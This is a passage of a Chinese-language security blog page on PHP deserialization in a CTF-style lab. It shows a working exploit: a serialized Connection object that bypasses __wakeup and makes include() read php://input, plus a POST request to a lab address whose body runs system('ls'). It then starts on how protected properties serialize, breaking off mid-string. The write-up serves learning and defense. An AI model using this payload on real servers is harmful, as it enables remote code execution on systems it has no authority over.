+      &lt;/pre&gt;
+
+          &lt;?php
+      }
+
+      $obj2 = unserialize($_GET['un']);
+
+
+
+
+      ?&gt;
+
+      &lt;!-- flag is in flag.php --&gt;
+</code></pre><p>这个题目要结合文件包含漏洞触发命令执行</p>
+<p>因为存在多个魔法函数，这里就要知道各个魔法函数的执行顺序。在序列化的时候可以直接删除<code>__sleep()</code>以减少影响，其次是利用属性个数大于真实属性个数绕过<code>__wakeup</code>函数，同时因为限制了<code>php://filer</code>因此需要利用<code>php://input</code>来执行代码</p>
+<pre><code>&lt;?php
+//error_reporting(0);
+class Connection
+{
+    public $file;
+
+    public function __construct($file)
+    {
+        $this-&gt;file = $file;
+    }
+
+    public function __wakeup()
+    {
+        $this-&gt;file = 'wakeup.txt';
+    }
+
+    public function __destruct()
+    {
+        include($this-&gt;file);
+    }
+}
+//      $obj2 = unserialize($_GET['un']);
+
+$a = new Connection(&quot;php://input&quot;);
+$b = serialize($a);
+print_r($b);
+</code></pre><pre><code>POST /?un=O:10:&quot;Connection&quot;:2:{s:4:&quot;file&quot;;s:11:&quot;php://input&quot;;} HTTP/1.1
+Host: 192.168.122.30:8011
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Length: 21
+
+&lt;?php system(&quot;ls&quot;);?&gt;
+</code></pre><p><img src="/pics/2020-10-23-15-45-15.png" alt=""></p>
+<h2 id="注入对象构造方法">注入对象构造方法</h2>
+<h3 id="当目标对象被privateprotected修饰时的反序列化漏洞">当目标对象被private、protected修饰时的反序列化漏洞</h3>
+<p>前文说了<code>private</code>和<code>protected</code>返回长度和<code>public</code>不一样的原因，这里再记录一下</p>
+<blockquote>
+<p>private属性序列化的时候格式是%00类名%00属性名
+protect属性序列化的时候格式是%00*%00属性名</p>
+</blockquote>
+<p><code>protected</code>情况下</p>
+<p>index.php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>{
+    <span style="color:#66d9ef">protected</span> $test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abab&#34;</span>;
+    <span style="color:#66d9ef">function</span> __destruct() {
+        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>;
+    }
+}
+
+$a <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;test&#34;</span>];
+$b <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($a);
+
+</code></pre></div><p>利用方式：
+先用正常方式输出序列化字符串</p>
+<pre><code>&lt;?php
+
+class A{
+    protected $test = &quot;what i what&quot;;
+    function __destruct() {
+        echo $this-&gt;test;
+    }
+}
+
+$a = new A();
+$b = serialize($a);
+print_r($b);
+
+</code></pre><p><img src="/pics/2020-10-23-16-30-10.png" alt=""></p>
+<p>得到`O:1:&ldquo;A&rdquo;:1:{s:7:&quot;</p>
+
+      </article>
+    </section>
+
+    
+    <article class="ui segment post-disqus-area" data-html2canvas-ignore>
+      <div id="disqus_thread"></div>
+      <script>
+        
+
+
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/fragrant10.github.io\/phpsec\/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0\/';  
+          this.page.identifier = '\/phpsec\/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0\/'; 
+        };
+
+        (function() { 
+          var d = document, s = d.createElement('script');
+          s.src = 'https://' + 'fragrant10' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </article>
+    
+
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2019 - 2021 fragrant10 的博客</p>
+              
+
+              <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <header class="ui basic very padded segment dream-header">
+  
+  <div class="ui small circular image">
+    <img src="/me/yy.jpg" alt="avatar" />
+  </div>
+  
+
+  <div class="content">
+    <h1 class="ui medium header">fragrant10 的博客<div class="sub header">与其感慨路难行，不如马上出发。</div>
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/posts">
+        <i class="archive icon" title="Archives"></i>
+      </a>
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="All Categories"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="All Tags"></i>
+      </a>
+    </article>
+
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+    
+
+    
+
+    
+    
+    
+          <div class="dream-tags">
+          
+          
+          
+            <a class="ui label" href="/tags/kubuntu/" title="kubuntu">
+              kubuntu
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/serialize/" title="serialize">
+              serialize
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/unserialize/" title="unserialize">
+              unserialize
+            </a>
+          
+          </div>
+    
+
+    
+  </div>
+</header>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment markdown-body">
+      <div class="ui medium header">About Me</div>
+      
+    </article>
+  </div>
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment">
+      <div class="ui medium header">Social Links</div>
+      <nav class="ui secondary menu dream-menu dream-socials">
+  
+  <div class="item">
+    <a href="/index.xml">
+      <i class="large rss square icon" title="RSS"></i>
+    </a>
+  </div>
+  
+
+  
+  <div class="item">
+    <a href="mailto:cerberusd3m0n@gmail.com">
+      <i class="large mail icon" title="Email"></i>
+    </a>
+  </div>
+  
+
+  
+  <div class="item">
+    <a href="https://twitter.com/fragrant" target="_blank">
+      <i class="large twitter icon" title="Twitter"></i>
+    </a>
+  </div>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <div class="item">
+    <a href="https://github.com/fragrant10" target="_blank">
+      <i class="large github icon" title="GitHub"></i>
+    </a>
+  </div>
+  
+
+  
+
+  
+</nav>
+
+    </article>
+  </div>
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+  </div>
+
+  
+  
+  <div class="sixteen wide mobile eight wide tablet eight wide computer column dream-column">
+    <article class="ui segment">
+      <div id="disqus_thread"></div>
+      <script>
+        
+
+
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/fragrant10.github.io\/phpsec\/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0\/';  
+          this.page.identifier = '/'; 
+        };
+
+        (function() { 
+          var d = document, s = d.createElement('script');
+          s.src = 'https://' + 'fragrant10' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </article>
+  </div>
+  
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script>
+  window.defaultDark =  null 
+  window.backgroundDark = "black"
+  window.backgroundImageDark =  null 
+  window.darkNav =  true 
+  window.hasTwitterEmbed =  null 
+  window.maxTags =  null 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/js/jquery.overlayScrollbars.min.js"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+
+
+<script src="https://cdn.jsdelivr.net/npm/luxon@1.26.0/build/global/luxon.min.js"></script>
+
+<script>
+  format()
+
+  function format() {
+    $('span[data-format="luxon"]').each(function () {
+      var date = $(this).text()
+
+      $(this).text(luxon.DateTime.fromISO(date, { locale: "en" }).toFormat("yyyy年MM月dd日"))
+    })
+  }
+</script>
+
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js"></script>
+
+
+
+<script>
+  hljs.initHighlightingOnLoad()
+  setHighlightTheme()
+
+  function setHighlightTheme() {
+    var isDark = localStore.getItem('hugo-theme-dream-is-dark')
+    isDark = isDark ? isDark : window.defaultDark ? 'y' : isDark
+
+    var lightTheme = "gruvbox-light"
+    var darkTheme = "gruvbox-dark"
+    var theme = isDark === 'y' ? darkTheme : lightTheme
+
+    $('link[data-highlight]').attr('href', 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/' + theme + '.min.css')
+    $('pre').css('background', isDark === 'y' ? '#333' : '')
+  }
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js"></script>
+<script src="/js/post.js" defer></script>
+
+
+    
+    <div class="ui inverted segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="Search" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/fragrant10.github.io/index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: true,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    
+  </body>
+</html>
